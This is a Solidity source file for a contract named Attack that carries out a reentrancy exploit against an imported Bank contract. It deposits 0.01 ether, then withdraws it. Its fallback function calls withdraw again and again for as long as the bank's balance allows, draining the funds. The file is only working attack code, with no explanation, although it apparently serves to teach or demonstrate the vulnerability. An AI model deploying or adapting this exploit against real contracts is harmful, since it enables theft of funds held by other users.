pragma solidity >=0.6.0 <0.7.0;

import "./Bank.sol";

contract Attack {
  Bank bank;
  uint constant target = 0.01 ether;

  constructor(Bank _bank) public {
    bank = Bank(_bank);
  }

  fallback() external payable {
    if (address(bank).balance >= target) {
      bank.withdraw(target);
    }
  }

  function attack() public payable {
    bank.deposit{value: target}();
    bank.withdraw(target);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}